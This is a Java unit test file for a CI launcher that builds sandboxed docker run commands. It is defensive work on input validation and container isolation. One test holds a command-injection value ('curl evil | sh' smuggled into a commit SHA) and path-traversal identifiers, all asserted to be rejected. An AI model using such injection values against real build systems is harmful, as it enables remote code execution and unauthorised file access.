package eu.wohlben.qits.ci.daemonhost;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.ci.daemonhost.CiDaemonLauncher.LaunchSpec;
import eu.wohlben.qits.ci.error.BadRequestException;
import java.util.List;
import org.junit.jupiter.api.Test;

/**
 * Argv and bootstrap assembly only — the real {@code docker run} is covered by the extended {@code
 * CiDaemonHandshakeIT}. Worth its own test because the argv <b>is</b> the sandbox: a flag lost in a
 * refactor is invisible everywhere else until it is invisible in production.
 */
public class CiDaemonLauncherTest {

  private CiDaemonLauncher launcher() {
    CiDaemonLauncher launcher = new CiDaemonLauncher();
    launcher.runtime = "docker";
    launcher.network = "qits-net";
    launcher.containerGitUrl = "http://qits-artifacts:8080/artifacts/";
    launcher.containerDaemonUrl = "ws://qits-ci:8080/ci/daemon";
    launcher.daemonVersion = java.util.Optional.of("deadbeef");
    launcher.daemonBinaryUrlTemplate = "http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:{version}";
    launcher.registerTimeoutSeconds = 60;
    launcher.outputMaxChars = 65536;
    launcher.memoryLimit = "4g";
    launcher.pidsLimit = "2048";
    launcher.cpus = "2";
    return launcher;
  }

  private final LaunchSpec spec =
      new LaunchSpec(
          "0123456789abcdef-run",
          2,
          "repo-1",
          "main",
          "cafebabe",
          "maven:3.9",
          "daemon-7",
          "s3cr3t",
          "http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:deadbeef");

  @Test
  public void buildsTheDetachedDockerRunArgv() {
    assertEquals(
        List.of(
            "docker",
            "run",
            "-d",
            "--name",
            "qits-ci-01234567-2",
            "--network",
            "qits-net",
            "--add-host=host.docker.internal:host-gateway",
            "--label",
            "qits.ci.run=0123456789abcdef-run",
            "--security-opt=no-new-privileges",
            "--cap-drop=ALL",
            "--memory",
            "4g",
            "--memory-swap",
            "4g",
            "--pids-limit",
            "2048",
            "--cpus",
            "2",
            "--env",
            "QITS_CI_DAEMON_ID=daemon-7",
            "--env",
            "QITS_CI_DAEMON_SECRET=s3cr3t",
            "--env",
            "QITS_CI_DAEMON_URL=ws://qits-ci:8080/ci/daemon",
            "--env",
            "QITS_CI_DAEMON_BINARY_URL=http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:deadbeef",
            "--env",
            "QITS_CI_REPOSITORY_URL=http://qits-artifacts:8080/artifacts/git/repo-1",
            "--env",
            "QITS_CI_BRANCH=main",
            "--env",
            "QITS_CI_SHA=cafebabe",
            "--env",
            "QITS_CI_REPO_ID=repo-1",
            "--env",
            "CI=true",
            "--env",
            "QITS_CI=true",
            "--entrypoint",
            "/bin/sh",
            "maven:3.9",
            "-c",
            CiDaemonLauncher.BOOTSTRAP),
        launcher().buildArgv(spec));
  }

  @Test
  public void theContainerIsDetachedAndNotSelfRemoving() {
    List<String> argv = launcher().buildArgv(spec);
    assertTrue(argv.contains("-d"), argv.toString());
    // --rm would race the `docker logs` capture that is the only diagnosis a container which never
    // registered can offer; every teardown is an explicit `docker rm -f` instead.
    assertFalse(argv.contains("--rm"), argv.toString());
  }

  @Test
  public void theBootstrapInterpolatesNothingAtAll() {
    String bootstrap = CiDaemonLauncher.BOOTSTRAP;
    // Every value the container needs is a shell variable it reads from its own environment. If any
    // of these appeared in the text, a repository would have found a way into a command line.
    for (String value :
        List.of("repo-1", "cafebabe", "main", "daemon-7", "s3cr3t", "maven:3.9", "qits-artifacts")) {
      assertFalse(bootstrap.contains(value), "bootstrap must not carry '" + value + "'");
    }
    assertEquals(bootstrap, launcher().buildArgv(spec).getLast());
    // ...and the invariant the whole feature rests on: no repo-controlled code in a host argv.
    assertFalse(bootstrap.contains("bash -c"), bootstrap);
    assertFalse(bootstrap.contains("docker"), bootstrap);
  }

  @Test
  public void theBootstrapProbesBothDownloadersAndSaysSoWhenItHasNeither() {
    String bootstrap = CiDaemonLauncher.BOOTSTRAP;
    assertTrue(bootstrap.contains("command -v wget"), bootstrap);
    assertTrue(bootstrap.contains("command -v curl"), bootstrap);
    // The image contract, stated in the container's own log — which is what the never-registered
    // reap captures, so an image missing a downloader diagnoses itself.
    assertTrue(bootstrap.contains("neither wget nor curl"), bootstrap);
    assertTrue(bootstrap.contains("chmod +x /tmp/qits-ci-daemon"), bootstrap);
    // exec, so the daemon is PID 1 and a `docker rm -f` signals it rather than a wrapping shell.
    assertTrue(bootstrap.contains("exec /tmp/qits-ci-daemon"), bootstrap);
  }

  @Test
  public void theBinaryUrlIsTheVersionResolvedIntoTheTemplate() {
    // One template rather than two free values, so the version pin and the download address cannot
    // drift apart. The {version} is the binary's sha256, which makes it the integrity pin too.
    assertEquals(
        "http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:abc123",
        launcher().resolveBinaryUrl("abc123"));
    assertEquals("deadbeef", launcher().daemonVersion());
  }

  @Test
  public void theCloneUrlEndsAtTheServiceAndCiAppendsTheGitSegment() {
    assertEquals("http://qits-artifacts:8080/artifacts/git/repo-1", launcher().cloneUrl("repo-1"));
  }

  @Test
  public void hostileIdentifiersAreRejectedBeforeAnyDockerCall() {
    CiDaemonLauncher launcher = launcher();
    LaunchSpec injectedSha =
        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u");
    assertThrows(BadRequestException.class, () -> launcher.launch(injectedSha));
    LaunchSpec traversal =
        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u");
    assertThrows(BadRequestException.class, () -> launcher.launch(traversal));
    LaunchSpec injectedBranch =
        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u");
    assertThrows(BadRequestException.class, () -> launcher.launch(injectedBranch));
  }

  @Test
  public void shortRunIdsAreUsedWholeInTheContainerName() {
    assertEquals("qits-ci-abc-0", CiDaemonLauncher.containerName("abc", 0));
  }
}
